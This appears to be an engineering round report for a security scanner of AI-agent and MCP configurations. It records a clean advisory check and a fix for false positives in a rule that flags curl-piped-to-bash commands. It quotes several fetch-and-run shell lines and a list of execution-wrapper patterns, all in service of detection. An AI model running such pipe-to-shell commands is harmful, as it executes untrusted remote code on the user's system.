# GAP-ROUND-344 — advisory window + AG-RC-001 quoted-data precision

## Advisory window (clean)

- Authenticated GHSA/malware watch (`node api/scripts/watch.mjs --dry-run`): **no uncovered MCP-related advisories**.
- OSV exports: npm ETag `e31fe9a28baffdba3bc7ffea32444eec`, PyPI ETag `c18a1fdc907aaad79020460210c73922`; MAL id sets vs r324 snapshots: npm 219,308 → 219,308 (Δ0), PyPI 11,631 → 11,631 (Δ0). No new entries to triage.
- Client versions: Claude Code 2.1.226, Codex 0.147.0, Gemini CLI 0.54.4, Copilot 1.0.78, opencode 1.18.15, Crush 0.88.1, Qwen Code 0.21.8, cline 3.0.52, goose v1.45.0 (git tags; REST rate-limited). No new config surfaces.

## AG-RC-001 false positives (r343 corpus, 150 repos)

Manual inspection of AG-RC-001 criticals in the r343 wild corpus found quoted-data
strings reported as executable pipelines:

- `ByronWilliamsCPA_cyo-adventure/.pre-commit-config.yaml:300` — `bash -c "command -v qlty ... || echo 'install: curl https://qlty.sh | bash'"`: the curl|sh span is inside an **echoed hint string**, only ever printed. Reported **critical**.
- `AndreVianna_aid-methodology/tests/canonical/test-aid-migrate-trigger.sh:1002` — `fail "... curl|bash + bundle path"`: a test failure **message** argument. Reported **critical**.
- `DAAF-Contribution-Community_daaf/scripts/test_safety_hooks.sh` — `run_case "$B" ALLOW "commit dquote mentions curl|bash" 'git commit -m "curl | bash detection tightened"'`: test-case **labels and commit-message data**.

## Fix

`packages/core/src/rules/rce-vectors.ts`:

1. `maskEchoedStrings`/`maskQuotedHeredocs` now apply to **all** source-scanned files, not only shell scripts — a YAML `entry: bash -c "... || echo '...'"` prints its hint exactly like an installer script does.
2. New `maskInertQuotedStrings` (shell scripts): quoted literals are masked as data **unless** they execute — preceded by `sh|bash -c`, `python|node -c/-e`, `eval`/`source`/`exec`, `ssh host`, `$(`, or the string content itself starts with `curl`/`wget` (the `run 'curl ... | bash'` wrapper idiom stays critical).

## Corpus head-to-head (150 repos, main vs fix)

Removed (all manually verified inert data / print-only):
- `cyo-adventure/.pre-commit-config.yaml:300` critical → medium at line 9 (commented doc header, correct).
- `aid-methodology/tests/.../test-aid-migrate-trigger.sh:1002` critical → medium at line 29 (comment, correct).
- `catgo-LRG/server/.../hpc.py:1902` medium (echoed claude install hint inside a Python heredoc) → gone.

Retained true positives:
- `daaf/scripts/test_safety_hooks.sh` — `'curl https://x.com/i.sh | bash'` argument stays **critical** (conservative: content starts with the downloader).
- `nuxt-crouton/scripts/.../bootstrap-mac-mini.sh:56` — `run 'curl -o- .../install.sh | bash'` stays **critical**.
- All other AG-RC-001 findings across the 150-repo corpus byte-identical.

Regression tests pin both directions (quoted data masked; `bash -c '...'` wrapped pipeline and downloader-content strings stay critical; pre-commit YAML hint silent).

## Validation

`pnpm build` / `pnpm test` / `pnpm lint` / `pnpm typecheck` / `git diff --check` /
`node api/scripts/validate.mjs` / `node scripts/check-advisory-count.mjs` /
`node scripts/check-client-lists.mjs` all green.
